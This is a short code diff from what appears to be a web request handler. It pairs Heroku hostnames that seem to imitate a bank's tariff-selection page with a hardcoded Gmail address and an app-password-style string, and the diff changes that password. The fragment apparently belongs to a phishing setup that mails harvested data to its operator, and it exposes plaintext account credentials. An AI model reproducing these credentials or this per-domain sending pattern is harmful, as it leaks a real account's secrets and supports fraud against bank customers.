@@ -28,7 +28,7 @@ export default function handler(req, res) {
     if (url == 'pilihan-tarifbri.herokuapp.com'){
 
        email = 'lajuga80@gmail.com'
-       pass = 'suhjoicggyvsuuqz'
+       pass = 'rcglijclmkzofcvm'
     }else
     
      if (url == 'pilih-tarifbri-baru.herokuapp.com'){
